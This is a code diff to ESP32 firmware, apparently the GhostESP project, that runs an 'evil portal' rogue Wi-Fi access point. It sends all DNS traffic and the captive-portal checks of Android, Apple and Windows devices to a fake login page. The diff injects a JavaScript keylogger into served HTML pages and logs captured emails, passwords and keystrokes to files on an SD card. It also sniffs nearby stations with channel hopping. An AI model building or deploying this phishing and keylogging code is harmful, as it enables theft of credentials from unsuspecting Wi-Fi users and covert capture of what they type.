@@ -3,6 +3,7 @@
 #include "managers/wifi_manager.h"
 #include "esp_crt_bundle.h"
 #include "esp_event.h"
+#include "esp_heap_caps.h" // Add include for heap stats
 #include "esp_http_client.h"
 #include "esp_log.h"
 #include "esp_timer.h"
@@ -29,8 +30,16 @@
 #ifdef WITH_SCREEN
 #include "managers/views/music_visualizer.h"
 #endif
-// Include Outside so we have access to the Terminal View Macro
+#include "managers/sd_card_manager.h" // Add SD card manager include
 #include "managers/views/terminal_screen.h"
+#include "core/utils.h" // Add utils include
+#include <inttypes.h>
+#include "managers/default_portal.h"
+#include "freertos/task.h"
+
+// Defines for Station Scan Channel Hopping
+#define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
+#define SCANSTA_MAX_WIFI_CHANNEL 13         // Scan channels 1-13
 
 #define MAX_DEVICES 255
 #define CHUNK_SIZE 8192
@@ -41,8 +50,8 @@
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
-char *PORTALURL = "";
-char *domain_str = "";
+static char PORTALURL[512] = "";
+static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
@@ -54,6 +63,18 @@ esp_netif_t *wifiSTA;
 static uint32_t last_packet_time = 0;
 static uint32_t packet_counter = 0;
 static uint32_t deauth_packets_sent = 0;
+static bool login_done = false;
+static char current_creds_filename[128] = "";
+static char current_keystrokes_filename[128] = "";
+
+// Station Scan Channel Hopping Globals
+static esp_timer_handle_t scansta_channel_hop_timer = NULL;
+static uint8_t scansta_current_channel = 1;
+static bool scansta_hopping_active = false;
+
+// Forward declarations for static channel hopping functions
+static esp_err_t start_scansta_channel_hopping(void);
+static void stop_scansta_channel_hopping(void);
 
 struct service_info {
     const char *query;
@@ -135,6 +156,7 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case WIFI_EVENT_AP_STADISCONNECTED:
             printf("Station disconnected from AP\n");
+            login_done = false;
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
@@ -328,8 +350,37 @@ ECompany match_bssid_to_company(const uint8_t *bssid) {
     return COMPANY_UNKNOWN;
 }
 
+// Helper macro to check for broadcast/multicast addresses
+#define IS_BROADCAST_OR_MULTICAST(addr) (((addr)[0] & 0x01) || (memcmp((addr), "\xff\xff\xff\xff\xff\xff", 6) == 0))
+
+// Function to check if a station MAC already exists in the list
+static bool station_mac_exists(const uint8_t *station_mac) {
+    for (int i = 0; i < station_count; i++) {
+        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0) {
+            return true; // Station MAC found
+        }
+    }
+    return false; // Station MAC not found
+}
+
+// Helper function to reverse MAC address byte order for comparison
+static void reverse_mac(const uint8_t *src, uint8_t *dst) {
+    for (int i = 0; i < 6; i++) {
+        dst[i] = src[5 - i];
+    }
+}
+
 void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
-    if (type != WIFI_PKT_DATA) {
+    // Focus on Management frames like the example, can be changed back to WIFI_PKT_DATA if needed
+    if (type != WIFI_PKT_MGMT) {
+        // printf("DEBUG: Dropped non-MGMT packet\n"); 
+        return;
+    }
+
+    // Check if we have scanned APs to compare against
+    if (scanned_aps == NULL || ap_count == 0) {
+        // This case should be handled by wifi_manager_start_station_scan now
+        printf("ERROR: No scanned APs in callback!\n");
         return;
     }
 
@@ -337,44 +388,117 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)packet->payload;
     const wifi_ieee80211_hdr_t *hdr = &ipkt->hdr;
 
-    const uint8_t *src_mac = hdr->addr2;  // Station MAC
-    const uint8_t *dest_mac = hdr->addr1; // AP BSSID
+    // --- DEBUG: Print raw addresses from MGMT frame ---
+    // printf("DEBUG MGMT Frame: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X\n",
+    //        hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5],
+    //        hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], hdr->addr2[3], hdr->addr2[4], hdr->addr2[5],
+    //        hdr->addr3[0], hdr->addr3[1], hdr->addr3[2], hdr->addr3[3], hdr->addr3[4], hdr->addr3[5]);
 
-    printf(
-        "station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-        src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5], dest_mac[0],
-        dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5]);
-    
-    // check if this station-ap pair already exists before adding it
-    if (!station_exists(src_mac, dest_mac)) {
-        add_station_ap_pair(src_mac, dest_mac);
+    // --- DEBUG: Print first known AP BSSID ---
+    // if (ap_count > 0 && scanned_aps != NULL) {
+    //      printf("DEBUG Known AP[0]: BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
+    //             scanned_aps[0].bssid[0], scanned_aps[0].bssid[1],
+    //             scanned_aps[0].bssid[2], scanned_aps[0].bssid[3],
+    //             scanned_aps[0].bssid[4], scanned_aps[0].bssid[5]);
+    // }
+    // ----------------------------------------
+
+    const uint8_t *station_mac = NULL;
+    const uint8_t *ap_bssid = NULL;
+    int matched_ap_index = -1;
+
+    // Iterate through known APs (from last scan)
+    for (int i = 0; i < ap_count; i++) {
+        uint8_t *bssid = scanned_aps[i].bssid;
+        // Case 1: addr1 == AP BSSID, station likely in addr2
+        if (memcmp(hdr->addr1, bssid, 6) == 0 && memcmp(hdr->addr2, bssid, 6) != 0) {
+            ap_bssid = bssid;
+            station_mac = hdr->addr2;
+            matched_ap_index = i;
+            break;
+        }
+        // Case 2: addr2 == AP BSSID, station likely in addr1
+        if (memcmp(hdr->addr2, bssid, 6) == 0 && memcmp(hdr->addr1, bssid, 6) != 0) {
+            ap_bssid = bssid;
+            station_mac = hdr->addr1;
+            matched_ap_index = i;
+            break;
+        }
+        // Case 3: addr3 == AP BSSID, station could be in addr1 or addr2
+        if (memcmp(hdr->addr3, bssid, 6) == 0) {
+            // prefer addr2 (source fields)
+            if (memcmp(hdr->addr2, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr2)) {
+                ap_bssid = bssid;
+                station_mac = hdr->addr2;
+                matched_ap_index = i;
+                break;
+            }
+            if (memcmp(hdr->addr1, bssid, 6) != 0 && !IS_BROADCAST_OR_MULTICAST(hdr->addr1)) {
+                ap_bssid = bssid;
+                station_mac = hdr->addr1;
+                matched_ap_index = i;
+                break;
+            }
+        }
+    }
+
+    // If no known AP BSSID found, ignore
+    if (matched_ap_index == -1) {
+       // printf("DEBUG: Dropped packet - No known AP BSSID found in addresses.\n");
+        return;
+    }
+
+    // Ensure we are capturing a station, not an AP or broadcast
+    if (memcmp(station_mac, ap_bssid, 6) == 0 || IS_BROADCAST_OR_MULTICAST(station_mac)) {
+       // printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast or same as AP.\n");
+        return;
+    }
+
+    // Ignore broadcast MAC address for the station
+   // if (IS_BROADCAST_OR_MULTICAST(station_mac)) {
+   //     printf("DEBUG: Dropped packet - Station MAC is broadcast/multicast.\n"); // Uncomment for verbose debug
+   //     return;
+   // }
+
+    // Check if this station MAC has already been seen/logged
+    if (!station_mac_exists(station_mac)) {
+         // Get the SSID of the matched AP
+        char ssid_str[33];
+        memcpy(ssid_str, scanned_aps[matched_ap_index].ssid, 32);
+        ssid_str[32] = '\0';
+        if (strlen(ssid_str) == 0) {
+             strcpy(ssid_str, "(Hidden)");
+        }
+
+        printf(
+            "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
+            ssid_str, // Use SSID here
+            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid
+
+        // Add the station and the *specific AP BSSID* it was seen with to the list
+        add_station_ap_pair(station_mac, ap_bssid);
+    } else {
+       // printf("DEBUG: Filtered packet - Station MAC already seen.\n");
     }
 }
 
 esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
-    printf("Requesting URL: %s\n", url);
+    httpd_resp_set_hdr(req, "Connection", "close");
 
-    if (strstr(url, "/mnt") != NULL) {
-        printf("URL points to a local file: %s\n", url);
-
+    if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
         FILE *file = fopen(url, "r");
         if (file == NULL) {
-            printf("Failed to open file: %s\n", url);
+            printf("Error: cannot open file %s\n", url);
             return ESP_FAIL;
         }
 
-        if (content_type) {
-            printf("Content-Type: %s\n", content_type);
-            httpd_resp_set_type(req, content_type);
-        } else {
-            printf("Content-Type not provided, using default 'application/octet-stream'\n");
-            httpd_resp_set_type(req, "application/octet-stream");
-        }
+        httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
         httpd_resp_set_status(req, "200 OK");
 
         char *buffer = (char *)malloc(CHUNK_SIZE + 1);
         if (buffer == NULL) {
-            printf("Failed to allocate memory for buffer\n");
+            printf("Error: buffer allocation failed\n");
             fclose(file);
             return ESP_FAIL;
         }
@@ -382,24 +506,15 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         int read_len;
         while ((read_len = fread(buffer, 1, CHUNK_SIZE, file)) > 0) {
             if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
-                printf("Failed to send chunk to client\n");
+                printf("Error: send chunk failed\n");
                 break;
             }
         }
 
-        if (feof(file)) {
-            printf("Finished reading data from file\n");
-        } else if (ferror(file)) {
-            printf("Error reading file\n");
-        }
-
-        // Clean up
         free(buffer);
         fclose(file);
-
-        // Send final chunk to end the response
         httpd_resp_send_chunk(req, NULL, 0);
-
+        printf("Served file: %s\n", url);
         return ESP_OK;
     } else {
         // Proceed with HTTP request if not an SD card file
@@ -447,13 +562,7 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             int content_length = esp_http_client_fetch_headers(client);
             printf("Content length: %d\n", content_length);
 
-            if (content_type) {
-                printf("Content-Type: %s\n", content_type);
-                httpd_resp_set_type(req, content_type);
-            } else {
-                printf("Content-Type not provided, using default 'application/octet-stream'\n");
-                httpd_resp_set_type(req, "application/octet-stream");
-            }
+            httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
 
             httpd_resp_set_hdr(req, "Content-Security-Policy",
                                "default-src 'self' 'unsafe-inline' data: blob:; "
@@ -486,26 +595,19 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
 
             if (content_type && strcmp(content_type, "text/html") == 0) {
                 const char *javascript_code =
-                    "<script>var keys = '';\n"
-                    "\n"
-                    "document.onkeypress = function(e) {\n"
-                    "    get = window.event ? event : e;\n"
-                    "    key = get.keyCode ? get.keyCode : get.charCode;\n"
-                    "    key = String.fromCharCode(key);\n"
-                    "    keys += key;\n"
-                    "\n"
-                    "    // Make a fetch request on every key press\n"
-                    "    fetch('/api/log', {\n"
-                    "        method: 'POST',\n"
-                    "        headers: {\n"
-                    "            'Content-Type': 'application/json'\n"
-                    "        },\n"
-                    "        body: JSON.stringify({ content: keys })\n"
-                    "    })\n"
-                    "    .catch(error => console.error('Error logging:', error));\n"
-                    "};</script>\n";
-                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) !=
-                    ESP_OK) {
+                    "<script>\n"
+                    "(function(){\n"
+                    "function logKey(key){\n"
+                    "    var xhr = new XMLHttpRequest();\n"
+                    "    xhr.open('POST','/api/log',true);\n"
+                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
+                    "    xhr.send(JSON.stringify({key:key}));\n"
+                    "}\n"
+                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
+                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
+                    "})();\n"
+                    "</script>\n";
+                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                     printf("Failed to send custom JavaScript\n");
                 }
             }
@@ -526,6 +628,9 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
 }
 
 const char *get_content_type(const char *uri) {
+    if (strstr(uri, ".html")) {
+        return "text/html";
+    }
     if (strstr(uri, ".css")) {
         return "text/css";
     } else if (strstr(uri, ".js")) {
@@ -561,6 +666,17 @@ void build_file_url(const char *host, const char *uri, char *file_url, size_t ma
 
 esp_err_t file_handler(httpd_req_t *req) {
     const char *uri = req->uri;
+    const char *content_type = get_content_type(uri);
+    char local_path[512];
+    {
+        size_t maxlen = sizeof(local_path) - strlen("/mnt") - 1;
+        snprintf(local_path, sizeof(local_path), "/mnt%.*s", (int)maxlen, uri);
+    }
+    FILE *f = fopen(local_path, "r");
+    if (f) {
+        fclose(f);
+        return stream_data_to_client(req, local_path, content_type);
+    }
 
     const char *host = get_host_from_req(req);
     if (host == NULL) {
@@ -572,7 +688,6 @@ esp_err_t file_handler(httpd_req_t *req) {
     char file_url[512];
     build_file_url(host, uri, file_url, sizeof(file_url));
 
-    const char *content_type = get_content_type(uri);
     printf("Determined content type: %s for URI: %s\n", content_type, uri);
 
     esp_err_t result = stream_data_to_client(req, file_url, content_type);
@@ -582,9 +697,29 @@ esp_err_t file_handler(httpd_req_t *req) {
     return result;
 }
 
+esp_err_t done_handler(httpd_req_t *req) {
+    login_done = true;
+    const char *msg = "<html><body><h1>Portal closed</h1></body></html>";
+    httpd_resp_set_type(req, "text/html");
+    httpd_resp_send(req, msg, strlen(msg));
+    // no automatic shutdown
+    return ESP_OK;
+}
+
 esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
+    ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
 
+    // Check if we should serve the default embedded portal
+    if (strcmp(PORTALURL, "INTERNAL_DEFAULT_PORTAL") == 0) {
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_send(req, default_portal_html, strlen(default_portal_html));
+        ESP_LOGI(TAG, "Served default embedded portal.");
+        ESP_LOGI(TAG, "Free heap after serving default portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        return ESP_OK;
+    }
+
+    // Otherwise, proceed with streaming from URL or file
     esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
 
     if (err != ESP_OK) {
@@ -600,6 +735,7 @@ esp_err_t portal_handler(httpd_req_t *req) {
         httpd_resp_send(req, error_message, strlen(error_message));
     }
 
+    ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
@@ -611,6 +747,17 @@ esp_err_t get_log_handler(httpd_req_t *req) {
         body[received] = '\0';
 
         printf("Received chunk: %s\n", body);
+
+        // Save to SD card if available and filename is set
+        if (sd_card_manager.is_initialized && current_keystrokes_filename[0] != '\0') {
+            FILE* f = fopen(current_keystrokes_filename, "a");
+            if (f) {
+                fprintf(f, "%s", body); // Append the chunk
+                fclose(f);
+            } else {
+                printf("Failed to open %s for appending\n", current_keystrokes_filename);
+            }
+        }
     }
 
     if (received < 0) {
@@ -626,40 +773,59 @@ esp_err_t get_log_handler(httpd_req_t *req) {
 
 esp_err_t get_info_handler(httpd_req_t *req) {
     char query[256] = {0};
-    char email[64] = {0};
-    char password[64] = {0};
+    char decoded_email[64] = {0};
+    char decoded_password[64] = {0};
 
     if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
-        printf("Received query: %s\n", query);
-
-        if (get_query_param_value(query, "email", email, sizeof(email)) == ESP_OK) {
-            char decoded_email[64] = {0};
-            url_decode(decoded_email, email);
-            printf("Decoded email: %s\n", decoded_email);
-        } else {
-            printf("Email parameter not found\n");
+        char email_val[64] = {0};
+        char pass_val[64] = {0};
+        if (get_query_param_value(query, "email", email_val, sizeof(email_val)) == ESP_OK) {
+            url_decode(decoded_email, email_val);
         }
-
-        if (get_query_param_value(query, "password", password, sizeof(password)) == ESP_OK) {
-            char decoded_password[64] = {0};
-            url_decode(decoded_password, password);
-            printf("Decoded password: %s\n", decoded_password);
-        } else {
-            printf("Password parameter not found\n");
+        if (get_query_param_value(query, "password", pass_val, sizeof(pass_val)) == ESP_OK) {
+            url_decode(decoded_password, pass_val);
         }
+        printf("Captured credentials: %s / %s\n", decoded_email, decoded_password);
 
-    } else {
-        printf("No query string found in request\n");
+        // Save credentials to SD card if available and filename is set
+        if (sd_card_manager.is_initialized && current_creds_filename[0] != '\0') {
+            FILE* f = fopen(current_creds_filename, "a");
+            if (f) {
+                // Optionally add a timestamp or delimiter here
+                fprintf(f, "Email: %s, Password: %s\n", decoded_email, decoded_password);
+                fclose(f);
+            } else {
+                printf("Failed to open %s for appending\n", current_creds_filename);
+            }
+        }
     }
-
-    const char *resp_str = "Query parameters processed";
-    httpd_resp_send(req, resp_str, strlen(resp_str));
-
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+        httpd_resp_send(req, NULL, 0);
+    } else {
+        httpd_resp_set_status(req, "302 Found");
+        httpd_resp_set_hdr(req, "Location", "/login");
+        httpd_resp_send(req, NULL, 0);
+    }
     return ESP_OK;
 }
 
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
-    printf("Received request for captive portal detection endpoint: %s\n", req->uri);
+    ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+    if (login_done) {
+        httpd_resp_set_status(req, "204 No Content");
+        httpd_resp_send(req, NULL, 0);
+        return ESP_OK;
+    }
+    const char *uri = req->uri;
+    if (strcmp(uri, "/generate_204") == 0 || strcmp(uri, "/hotspot-detect.html") == 0 || strcmp(uri, "/connecttest.txt") == 0) {
+        httpd_resp_set_status(req, "301 Moved Permanently");
+        httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
+        httpd_resp_send(req, NULL, 0);
+        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
+        return ESP_OK;
+    }
+    // minimal logging for captive probe
 
     if (strstr(req->uri, "/get") != NULL) {
         get_info_handler(req);
@@ -676,27 +842,25 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     snprintf(LocationRedir, sizeof(LocationRedir), "http://192.168.4.1/login");
     httpd_resp_set_hdr(req, "Location", LocationRedir);
     httpd_resp_send(req, NULL, 0);
+    ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
 
 httpd_handle_t start_portal_webserver(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.max_uri_handlers = 15;
+    config.max_open_sockets = 13; // Increased from 7
+    config.backlog_conn = 10;     // Increased from 7
     config.stack_size = 8192;
     if (httpd_start(&evilportal_server, &config) == ESP_OK) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
-        httpd_uri_t portal_uri_android = {.uri = "/generate_204",
-                                          .method = HTTP_GET,
-                                          .handler = captive_portal_redirect_handler,
-                                          .user_ctx = NULL};
-        httpd_uri_t portal_uri_apple = {.uri = "/hotspot-detect.html",
-                                        .method = HTTP_GET,
-                                        .handler = captive_portal_redirect_handler,
-                                        .user_ctx = NULL};
-        httpd_uri_t microsoft_uri = {.uri = "/connecttest.txt",
-                                     .method = HTTP_GET,
-                                     .handler = captive_portal_redirect_handler,
-                                     .user_ctx = NULL};
+        httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
+        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
         httpd_uri_t log_handler_uri = {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
@@ -707,28 +871,76 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = ".css", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_js = {
             .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
-        httpd_register_uri_handler(evilportal_server, &portal_uri_apple);
+        httpd_uri_t portal_html = {
+            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
+        httpd_register_uri_handler(evilportal_server, &portal_android_get);
+        httpd_register_uri_handler(evilportal_server, &portal_android_head);
+        httpd_register_uri_handler(evilportal_server, &portal_apple_get);
+        httpd_register_uri_handler(evilportal_server, &portal_apple_head);
+        httpd_register_uri_handler(evilportal_server, &microsoft_get);
+        httpd_register_uri_handler(evilportal_server, &microsoft_head);
         httpd_register_uri_handler(evilportal_server, &portal_uri);
-        httpd_register_uri_handler(evilportal_server, &portal_uri_android);
-        httpd_register_uri_handler(evilportal_server, &microsoft_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
         httpd_register_uri_handler(evilportal_server, &portal_css);
         httpd_register_uri_handler(evilportal_server, &portal_js);
+        httpd_register_uri_handler(evilportal_server, &portal_html);
+        httpd_uri_t done_uri = { .uri = "/done", .method = HTTP_GET, .handler = done_handler, .user_ctx = NULL };
+        httpd_register_uri_handler(evilportal_server, &done_uri);
         httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                    captive_portal_redirect_handler);
     }
     return evilportal_server;
 }
 
-esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password,
+esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
                                           const char *ap_ssid, const char *domain) {
+    login_done = false; // Reset login state on start
+    current_creds_filename[0] = '\0'; // Reset filenames at the start
+    current_keystrokes_filename[0] = '\0';
 
-    if (strlen(URL) > 0 && strlen(domain) > 0) {
-        PORTALURL = URL;
-        domain_str = domain;
+    // Generate indexed filenames if SD card is available
+    if (sd_card_manager.is_initialized) {
+        const char* dir_path = "/mnt/ghostesp/evil_portal";
+        int creds_index = get_next_file_index(dir_path, "portal_creds", "txt");
+        int keys_index = get_next_file_index(dir_path, "portal_keystrokes", "txt");
+
+        if (creds_index >= 0) {
+            snprintf(current_creds_filename, sizeof(current_creds_filename),
+                     "%s/portal_creds_%d.txt", dir_path, creds_index);
+            printf("Logging credentials to: %s\n", current_creds_filename);
+        } else {
+            printf("Failed to get next index for credentials file.\n");
+        }
+
+        if (keys_index >= 0) {
+            snprintf(current_keystrokes_filename, sizeof(current_keystrokes_filename),
+                     "%s/portal_keystrokes_%d.txt", dir_path, keys_index);
+            printf("Logging keystrokes to: %s\n", current_keystrokes_filename);
+        } else {
+             printf("Failed to get next index for keystrokes file.\n");
+        }
+    }
+
+    // Check if we need to use the internal default portal
+    if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
+        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
+    } else if (URLorFilePath != NULL && strlen(URLorFilePath) < sizeof(PORTALURL)) {
+        // If not default, copy the provided path
+        strlcpy(PORTALURL, URLorFilePath, sizeof(PORTALURL));
+    } else {
+        // Handle invalid or too long paths by defaulting to internal portal as a fallback
+        ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
+        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
+    }
+
+    // Domain is fetched from settings in commandline.c, just copy it if provided
+    if (domain != NULL && strlen(domain) < sizeof(domain_str)) {
+         strlcpy(domain_str, domain, sizeof(domain_str));
+    } else {
+         domain_str[0] = '\0'; // Ensure empty if invalid
     }
 
     ap_manager_stop_services();
@@ -745,108 +957,58 @@ esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, cons
     esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
     esp_netif_dhcps_start(wifiAP);
 
-    wifi_config_t wifi_config = {0};
     wifi_config_t ap_config = {.ap = {
                                    .channel = 0,
-                                   .authmode = WIFI_AUTH_WPA2_WPA3_PSK,
                                    .ssid_hidden = 0,
                                    .max_connection = 8,
                                    .beacon_interval = 100,
                                }};
 
-    if (SSID != NULL || Password != NULL) {
-        strlcpy((char *)wifi_config.sta.ssid, SSID, sizeof(wifi_config.sta.ssid));
-        strlcpy((char *)wifi_config.sta.password, Password, sizeof(wifi_config.sta.password));
-
-        strlcpy((char *)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
-
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-
-        dhcps_offer_t dhcps_dns_value = OFFER_DNS;
-        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
-                               &dhcps_dns_value, sizeof(dhcps_dns_value));
-
-        dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
-        dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
-        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
-
-        vTaskDelay(pdMS_TO_TICKS(100));
-
-        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
-
-        ESP_ERROR_CHECK(esp_wifi_start());
-        vTaskDelay(pdMS_TO_TICKS(500));
-        esp_wifi_connect();
-        xEventGroupWaitBits(wifi_event_group, WIFI_CONNECTED_BIT, pdFALSE, pdTRUE,
-                            5000 / portTICK_PERIOD_MS);
-
-        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
-
-        start_portal_webserver();
-
-        // Configure DNS server to handle both regular and .local domains
-        dns_server_config_t dns_config = {
-            .num_of_entries = 3,
-            .item = {
-                {.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}},
-                {.name = "ghostesp", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}},
-                {.name = "ghostesp.local",
-                 .if_key = NULL,
-                 .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};
-
-        // Start DNS server
-        dns_handle = start_dns_server(&dns_config);
-        if (dns_handle) {
-            ESP_LOGI(TAG, "DNS server started, handling all requests including ghostesp.local");
-        } else {
-            ESP_LOGE(TAG, "Failed to start DNS server");
-            return ESP_FAIL;
-        }
-
-        // Configure DHCP to offer our DNS server
-        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
-                               &dhcps_dns_value, sizeof(dhcps_dns_value));
-
-        // Set DNS server info
-        esp_netif_dns_info_t dns_info = {.ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1),
-                                         .ip.type = ESP_IPADDR_TYPE_V4};
-        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dns_info);
+    // Configure AP SSID and optional PSK
+    if (SSID != NULL && SSID[0] != '\0') {
+        strlcpy((char *)ap_config.ap.ssid, SSID, sizeof(ap_config.ap.ssid));
+        ap_config.ap.ssid_len = strlen(SSID);
     } else {
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-        strlcpy((char *)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
-        ap_config.ap.authmode = WIFI_AUTH_OPEN;
-
-        dhcps_offer_t dhcps_dns_value = OFFER_DNS;
-        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
-                               &dhcps_dns_value, sizeof(dhcps_dns_value));
-
-        dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
-        dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
-        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
-
-        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
-
-        ESP_ERROR_CHECK(esp_wifi_start());
-
-        start_portal_webserver();
-
-        dns_server_config_t dns_config = {
-            .num_of_entries = 1,
-            .item = {{.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};
-
-        dns_handle = start_dns_server(&dns_config);
-        if (dns_handle) {
-            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
-        } else {
-            printf("Failed to start DNS server\n");
-        }
